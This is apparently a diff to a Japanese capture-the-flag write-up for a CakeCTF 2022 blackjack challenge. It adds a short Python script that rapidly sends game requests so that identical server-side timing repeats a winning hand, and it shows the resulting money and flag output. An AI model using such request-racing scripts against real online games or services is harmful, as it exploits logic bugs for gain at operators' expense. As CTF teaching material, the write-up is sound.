@@ -110,8 +110,8 @@ def future_prediction(user_id, player_hand):
     return []
 ```
 これにより、相手の手札とデッキのカードがわかる状態でブラックジャックをプレイできる。  
-効率的な勝ち方は考えられるが、面倒なのでbustしない程度に21に限りなく近くなるまでhitしまくる戦略をとる。  
-以下の適当なスクリプトで行う(よくもまあこんな雑さで動いたなと思っていると、リクエストが速いため同じ手で複数回勝利していた)。  
+効率的な勝ち方は考えられるが、面倒なのでbustしない程度に21に限りなく近くなるまでhitしまくる戦略をとり様子を見る。  
+以下の適当なスクリプトで行う。  
 ```python
 import sys
 import json
@@ -195,6 +195,35 @@ while True:
 ```bash
 $ python satoki_blackjack.py
 "CakeCTF{INFAMOUS_LOGIC_BUG}"
+```
+flagは得られた。  
+よくもまあこんな雑さで動いたなと思っていると、リクエストが速いため同じ手(サーバ内が同じ時間)で複数回勝利していた。  
+つまり乱数の予測など不要であり、高速にリクエストを送る以下のスクリプトで事足りる(速度にもよるが、手札から見るに2~3回程度強めのカードが来ればよい)。  
+```python
+import json
+import requests
+
+session = requests.Session()
+session.get("http://misc.2022.cakectf.com:10011/user/new")
+while True:
+    res = session.get("http://misc.2022.cakectf.com:10011/game/new").content.decode()
+    #print(f"player_hand: {json.loads(res)['player_hand']}")
+    res = session.get("http://misc.2022.cakectf.com:10011/game/act", params={"action": "stand"}).content.decode()
+    if "lose" in res:
+        session.get("http://misc.2022.cakectf.com:10011/user/new")
+    if "CakeCTF" in res:
+        print(f"flag: {json.loads(res)['flag']}")
+        break
+    print(f"money: {json.loads(res)['money']}")
+```
+適切な性能を持つ回線と端末で実行する。  
+```bash
+$ python satoki_blackjack_kai.py
+~~~
+money: 219902325555200
+money: 439804651110400
+money: 879609302220800
+flag: "CakeCTF{INFAMOUS_LOGIC_BUG}"
 ```
 flagが得られた。  
 
